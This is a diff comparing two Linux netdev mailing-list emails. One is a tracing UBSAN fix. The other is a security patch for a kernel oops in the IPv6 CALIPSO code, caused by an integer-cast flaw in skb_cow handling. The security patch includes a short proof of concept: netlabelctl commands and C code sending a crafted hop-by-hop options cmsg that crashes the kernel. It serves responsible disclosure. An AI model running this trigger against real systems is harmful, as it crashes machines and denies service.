@@ -1,63 +1,94 @@
-Return-Path: <netdev+bounces-245551-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-245552-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 6C705CD1201
-	for <lists+netdev@lfdr.de>; Fri, 19 Dec 2025 18:24:25 +0100 (CET)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 152B3CD12EC
+	for <lists+netdev@lfdr.de>; Fri, 19 Dec 2025 18:39:10 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id B48A830194D4
-	for <lists+netdev@lfdr.de>; Fri, 19 Dec 2025 17:21:25 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 736C2308C4A3
+	for <lists+netdev@lfdr.de>; Fri, 19 Dec 2025 17:37:11 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 652AE31A575;
-	Fri, 19 Dec 2025 17:21:24 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id E9CA925A655;
+	Fri, 19 Dec 2025 17:37:10 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="Iy/mmZa5"
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="qYrTR9Zj"
 X-Original-To: netdev@vger.kernel.org
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f177.google.com (mail-pl1-f177.google.com [209.85.214.177])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E6CA3339B41
-	for <netdev@vger.kernel.org>; Fri, 19 Dec 2025 17:21:21 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 46BD41A23A0
+	for <netdev@vger.kernel.org>; Fri, 19 Dec 2025 17:37:01 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.177
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1766164884; cv=none; b=QARkXbu7jdFR6KjaVQUFL2CdVgTBuTRLrIp+AYiBGPdjmRSQdGWwCJ/Oh1gCgZpExQh07N74Lhd4FRgkU0pZ0F86h8ozbX7u6jaVo63JMniWcpy7Xac/WOuyf//t82Y2fqIdV8QtDdr8CkdVV+//6wYikvKnhOx0al1DjHCvaMg=
+	t=1766165830; cv=none; b=NQGm35/JyrjVyuzutRa5ecQ+gs8dckZGjsKfq9XFm5i+29DLQvJ+50RUYkmGESrZupOb8FP+KGpD22IOteFgplMiz28Wr0Hz+47RSxFvpqXbOyTeVsIuFEmNs1hYnxn48qRTZZN1WYngkDA07r2Wpp9yYQDlLM/hisIxlEVuQ2w=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1766164884; c=relaxed/simple;
-	bh=sPdvCaqzHL1BNrBCKwAotEVYl2eJOECD8r+TGqurXPc=;
-	h=From:To:Subject:Date:Message-ID:MIME-Version; b=UV+HqP6g2qwWTNvRdjMrGhYeh5uHagXzXBpkF95xpzOP0n45HMYY7f6mxE0Lm3Ek5MjxFQP38diqVjtTqHIjGUJixcF+jhbleFm2bDneoAjlTluiKHSFJEzbA0fHeErsUwQldInTwRQJXWHgO3GGJ0R8QxHOo9n3NX7R9iubhuI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=Iy/mmZa5; arc=none smtp.client-ip=170.10.133.124
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1766164880;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:
-	 content-transfer-encoding:content-transfer-encoding;
-	bh=pPnhyw/i/3SzlIuWdiWigNi8X6TDLr93j9cN8Sri8f4=;
-	b=Iy/mmZa5kQBMFDKLMrTgcfbIomzmkyPJqdKxgeHwwgPdeLbrBtV2Uhjvq9Y3ZeLFbv/77H
-	TEbFKyGTLqtMoqtMfgMAAQWMtDR7oo5TJU4LLWjFwHL4WSrVX/jUmJ43Hv2tasqTADCktE
-	HW18jYNcXx6CdAzDaGci7pn0qTEaH1Y=
-Received: from mx-prod-mc-08.mail-002.prod.us-west-2.aws.redhat.com
- (ec2-35-165-154-97.us-west-2.compute.amazonaws.com [35.165.154.97]) by
- relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.3,
- cipher=TLS_AES_256_GCM_SHA384) id us-mta-460-8M2yYNr4P8C71VC9hEOD4A-1; Fri,
- 19 Dec 2025 12:21:18 -0500
-X-MC-Unique: 8M2yYNr4P8C71VC9hEOD4A-1
-X-Mimecast-MFC-AGG-ID: 8M2yYNr4P8C71VC9hEOD4A_1766164878
-Received: from mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com (mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com [10.30.177.4])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
-	(No client certificate requested)
-	by mx-prod-mc-08.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTPS id F073A18005AE
-	for <netdev@vger.kernel.org>; Fri, 19 Dec 2025 17:21:17 +0000 (UTC)
-Received: from gerbillo.redhat.com (unknown [10.44.32.215])
-	by mx-prod-int-01.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTP id 3488F30001A2
-	for <netdev@vger.kernel.org>; Fri, 19 Dec 2025 17:21:16 +0000 (UTC)
-From: Paolo Abeni <pabeni@redhat.com>
-To: netdev@vger.kernel.org
-Subject: [PATCH net] trace: fix UBSAN warning in __remove_instance
-Date: Fri, 19 Dec 2025 18:21:03 +0100
-Message-ID: <9c3f30d166d7d4e08afd81d462413dff1703776a.1766164851.git.pabeni@redhat.com>
+	s=arc-20240116; t=1766165830; c=relaxed/simple;
+	bh=fBPcLJzYU1D6olJZyG5QeOnFX1y9SnFqnMzwb2S3bOk=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=e4x9qfMOBcv2icDVFWK1GTgkIXRsWfJPCxhz4xckvko0oeA8tbFsSqA0js6W/Nh2MVPLChl0LJiY7dn+rRyvh3wmfYiMYvPNA8TVdmLvE/CKaH74vuwQy/8SYIRI49XYOxvp1/YJ7tUEQw5lULRIR5GZaet7jwLYpHCGf8LF6GY=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=qYrTR9Zj; arc=none smtp.client-ip=209.85.214.177
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
+Received: by mail-pl1-f177.google.com with SMTP id d9443c01a7336-2a0834769f0so19373715ad.2
+        for <netdev@vger.kernel.org>; Fri, 19 Dec 2025 09:37:01 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=asu.edu; s=google; t=1766165820; x=1766770620; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to;
+        bh=qWEkn28lSdsbrh7pndq+YOZrud9XonPh1681Hfh8gwc=;
+        b=qYrTR9Zj4SriTC+cbYu2aCgeK/JMdMTWXP4/db1cro68/fkw8DaE4axBwVkkGr4KQh
+         fRi8wV7gZbYkKAw3hcNgLmlk3lTIYvehe933PFDCIpQbe7VTezvIJdeWUP7vOZW34SY6
+         aqTIg6V/29tMqx+OPmHb8ItLbBDLywJmC+3lHUtcQ3AHt4coxsFScXcq+4hTqaNB9NmM
+         FgfluVwDZDYiEDF27sTaxfDat17qryYTBib5okRnwONk+UEChQvSVThBPjrIt2LZxEVy
+         Adv4friksAt2r8jGIAv8L0B3TkuKVT1MKfCHeXwe4wo1afazBKec5r2LLb4SWvKN3Z0t
+         z/jw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1766165820; x=1766770620;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=qWEkn28lSdsbrh7pndq+YOZrud9XonPh1681Hfh8gwc=;
+        b=uK7tq+iLs8ZO8c2ucbtbsyflCDYX9ZgssE6a0wN0vMPb3FWUJDYkGG5QUXTzBLWktN
+         +JTRe2Vt/bHFn0j4YWEPq+h4LqSADSxYoU9L/cb1QeTL5yo3fv0HimHv958I1e8UTAqT
+         RRQHqohjl35wfiLlf1k4ASC+viuzYYnf6sUI8Uavh3mcUL8Wk+ivcaf9JjookNog2Wam
+         Z+U4JDAUALJD5sgzVnTLPtadNW6SUreUjES3e6cKPRiakukKb4tL4EEeY9VfFSh2yOnF
+         OPhwnty4gU/XsWPd5AcPG0ZFzNaMs83gtA9IL0HKsl/989441kxqGJd5GxFVyjF7Kvh9
+         Qktg==
+X-Forwarded-Encrypted: i=1; AJvYcCXt5S6hx+RgjpLrpvLrOTXUaQ4fRgFBA5rExvjtoHePO1ZRRaOkvfSDSv437eCGHBWGfqFi/OM=@vger.kernel.org
+X-Gm-Message-State: AOJu0YzVkva8rxxnt6YDSocoXKuVF0Oe1hcLdZeL9H6MTa9KWr09Ujau
+	2Sz/v+/LYznX3AKGfTkQghoVnRVnY9hH3QX4wXzncY9qA2hu+mHgoTkixFcvL/M/rw==
+X-Gm-Gg: AY/fxX4WUAxaBtNC8HFT3S0RHNLbzv9TO6E3o+SZL+/5835VZPNVTgv6ica3f3XwHb2
+	X4pKwcADCug/Ezw3X4j3OCw24MZtkuA77vj4Sp8B0c9V6zuK0q8vKNTyGYlrCyjbx9mo5o83Oxz
+	f2a5iPvQ7ZWQR0tR0LzrUE4b1r0SluJKyqILig2/OYnTf2oTGNFPMilrmrzIbIqqH9QQvbWzExW
+	9ygG+Ea6zL5fjYPb2YWg0/6a37WimCgpjsSYxmms1jXn4f5x7XOTOFX159Me5WDjkJt7dHvsNGH
+	EMP+l2qWvuoaECN+EHAvRhSwsLFgmTgi278SQVqdu4vOlWI/dVmXrY4pCKG1Z6Z2QhbrGrOO3mO
+	M45FNxD5biF7pJuk+IuJmcceFz5aEwZLC+QkYYThnbpq+p7lDjMOsAsEya/HttCEc4IlvJiHqcj
+	OBt3mrTEksUGZsmN1WqZMSc8YuXisM91WDoTdYfeQG2hdUkdrReQ==
+X-Google-Smtp-Source: AGHT+IGZmLahTbQF2vXNJwc6Yh8rcMpPUTa8s3yQUjD19Kf28sYcltQks0QBdNLfHalPlNgYh5BpCQ==
+X-Received: by 2002:a05:7022:428b:b0:11b:94ab:be03 with SMTP id a92af1059eb24-121722ab5efmr4022936c88.20.1766165820360;
+        Fri, 19 Dec 2025 09:37:00 -0800 (PST)
+Received: from will-mint.dhcp.asu.edu (ip72-200-102-19.tc.ph.cox.net. [72.200.102.19])
+        by smtp.googlemail.com with ESMTPSA id a92af1059eb24-121724de268sm7982235c88.8.2025.12.19.09.36.59
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 19 Dec 2025 09:36:59 -0800 (PST)
+From: Will Rosenberg <whrosenb@asu.edu>
+To: 
+Cc: security@kernel.org,
+	Will Rosenberg <whrosenb@asu.edu>,
+	Paul Moore <paul@paul-moore.com>,
+	"David S. Miller" <davem@davemloft.net>,
+	David Ahern <dsahern@kernel.org>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Huw Davies <huw@codeweavers.com>,
+	netdev@vger.kernel.org,
+	linux-security-module@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
+Date: Fri, 19 Dec 2025 10:36:37 -0700
+Message-Id: <20251219173637.797418-1-whrosenb@asu.edu>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -65,71 +96,102 @@ List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-Scanned-By: MIMEDefang 3.4.1 on 10.30.177.4
 
-From: Darrick J. Wong <djwong@kernel.org>
+There exists a kernel oops caused by a BUG_ON(nhead < 0) at
+net/core/skbuff.c:2232 in pskb_expand_head().
+This bug is triggered as part of the calipso_skbuff_setattr()
+routine when skb_cow() is passed headroom > INT_MAX
+(i.e. (int)(skb_headroom(skb) + len_delta) < 0).
 
-xfs/558 triggers the following UBSAN warning:
+The root cause of the bug is due to an implicit integer cast in
+__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
+that delta = headroom - skb_headroom(skb) is never negative, otherwise
+we will trigger a BUG_ON in pskb_expand_head(). However, if
+headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
+becomes negative, and pskb_expand_head() is passed a negative value for
+nhead.
 
- ------------[ cut here ]------------
- UBSAN: shift-out-of-bounds in /storage/home/djwong/cdev/work/linux-xfs/kernel/trace/trace.c:10510:10
- shift exponent 32 is too large for 32-bit type 'int'
- CPU: 1 UID: 0 PID: 888674 Comm: rmdir Not tainted 6.19.0-rc1-xfsx #rc1 PREEMPT(lazy)  dbf607ef4c142c563f76d706e71af9731d7b9c90
- Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-4.module+el8.8.0+21164+ed375313 04/01/2014
- Call Trace:
-  <TASK>
-  dump_stack_lvl+0x4a/0x70
-  ubsan_epilogue+0x5/0x2b
-  __ubsan_handle_shift_out_of_bounds.cold+0x5e/0x113
-  __remove_instance.part.0.constprop.0.cold+0x18/0x26f
-  instance_rmdir+0xf3/0x110
-  tracefs_syscall_rmdir+0x4d/0x90
-  vfs_rmdir+0x139/0x230
-  do_rmdir+0x143/0x230
-  __x64_sys_rmdir+0x1d/0x20
-  do_syscall_64+0x44/0x230
-  entry_SYSCALL_64_after_hwframe+0x4b/0x53
- RIP: 0033:0x7f7ae8e51f17
- Code: f0 ff ff 73 01 c3 48 8b 0d de 2e 0e 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 54 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 01 c3 48 8b 15 b1 2e 0e 00 f7 d8 64 89 02 b8
- RSP: 002b:00007ffd90743f08 EFLAGS: 00000246 ORIG_RAX: 0000000000000054
- RAX: ffffffffffffffda RBX: 00007ffd907440f8 RCX: 00007f7ae8e51f17
- RDX: 00007f7ae8f3c5c0 RSI: 00007ffd90744a21 RDI: 00007ffd90744a21
- RBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000
- R10: 00007f7ae8f35ac0 R11: 0000000000000246 R12: 00007ffd90744a21
- R13: 0000000000000001 R14: 00007f7ae8f8b000 R15: 000055e5283e6a98
-  </TASK>
- ---[ end trace ]---
+Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
+"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
+by only using skb_cow() to grow headroom.
 
-whilst tearing down an ftrace instance.  TRACE_FLAGS_MAX_SIZE is now 64,
-so the mask comparison expression must be typecast to a u64 value to
-avoid an overflow.  AFAICT, ZEROED_TRACE_FLAGS is already cast to ULL
-so this is ok.
+PoC:
+	Using `netlabelctl` tool:
 
-Fixes: bbec8e28cac592 ("tracing: Allow tracer to add more than 32 options")
-Signed-off-by: "Darrick J. Wong" <djwong@kernel.org>
-Signed-off-by: Paolo Abeni <pabeni@redhat.com>
+        netlabelctl map del default
+        netlabelctl calipso add pass doi:7
+        netlabelctl map add default address:0::1/128 protocol:calipso,7
+
+        Then run the following PoC:
+
+        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+
+        // setup msghdr
+        int cmsg_size = 2;
+        int cmsg_len = 0x60;
+        struct msghdr msg;
+        struct sockaddr_in6 dest_addr;
+        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
+                        sizeof(struct cmsghdr) + cmsg_len);
+        msg.msg_name = &dest_addr;
+        msg.msg_namelen = sizeof(dest_addr);
+        msg.msg_iov = NULL;
+        msg.msg_iovlen = 0;
+        msg.msg_control = cmsg;
+        msg.msg_controllen = cmsg_len;
+        msg.msg_flags = 0;
+
+        // setup sockaddr
+        dest_addr.sin6_family = AF_INET6;
+        dest_addr.sin6_port = htons(31337);
+        dest_addr.sin6_flowinfo = htonl(31337);
+        dest_addr.sin6_addr = in6addr_loopback;
+        dest_addr.sin6_scope_id = 31337;
+
+        // setup cmsghdr
+        cmsg->cmsg_len = cmsg_len;
+        cmsg->cmsg_level = IPPROTO_IPV6;
+        cmsg->cmsg_type = IPV6_HOPOPTS;
+        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
+        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80
+
+        sendmsg(fd, &msg, 0);
+
+Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly.")
+Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
 ---
-Note: DO NOT MERGE on net nor net-next. Reshared on the netdev ML to fix
-CI failures caused by the blamed commit above. Will rot on PW until the
-net PR or someone can access the CI hosts, whatever come first.
----
- kernel/trace/trace.c | 2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
 
-diff --git a/kernel/trace/trace.c b/kernel/trace/trace.c
-index e575956ef9b5..6f2148df14d9 100644
---- a/kernel/trace/trace.c
-+++ b/kernel/trace/trace.c
-@@ -10507,7 +10507,7 @@ static int __remove_instance(struct trace_array *tr)
+Notes:
+    -Changing __skb_cow() would likely require an audit of all its use
+    cases due to its long legacy in the kernel. After private discussions,
+    it was decided that this patch should be applied to calipso to remedy
+    the immediate symptoms and allow for easy backporting. However, net
+    devs should consider remedying the root cause through __skb_cow()
+    and skb_cow().
+    
+    -Paul, please let me know if I should add any form of credit for
+    the patch code, such as "Suggested-By."
+
+ net/ipv6/calipso.c | 3 ++-
+ 1 file changed, 2 insertions(+), 1 deletion(-)
+
+diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
+index df1986973430..21f6ed126253 100644
+--- a/net/ipv6/calipso.c
++++ b/net/ipv6/calipso.c
+@@ -1342,7 +1342,8 @@ static int calipso_skbuff_setattr(struct sk_buff *skb,
+ 	/* At this point new_end aligns to 4n, so (new_end & 4) pads to 8n */
+ 	pad = ((new_end & 4) + (end & 7)) & 7;
+ 	len_delta = new_end - (int)end + pad;
+-	ret_val = skb_cow(skb, skb_headroom(skb) + len_delta);
++	ret_val = skb_cow(skb,
++			  skb_headroom(skb) + (len_delta > 0 ? len_delta : 0));
+ 	if (ret_val < 0)
+ 		return ret_val;
  
- 	/* Disable all the flags that were enabled coming in */
- 	for (i = 0; i < TRACE_FLAGS_MAX_SIZE; i++) {
--		if ((1 << i) & ZEROED_TRACE_FLAGS)
-+		if ((1ULL << i) & ZEROED_TRACE_FLAGS)
- 			set_tracer_flag(tr, 1ULL << i, 0);
- 	}
- 
+
+base-commit: ea1013c1539270e372fc99854bc6e4d94eaeff66
 -- 
-2.52.0
+2.34.1
 
 
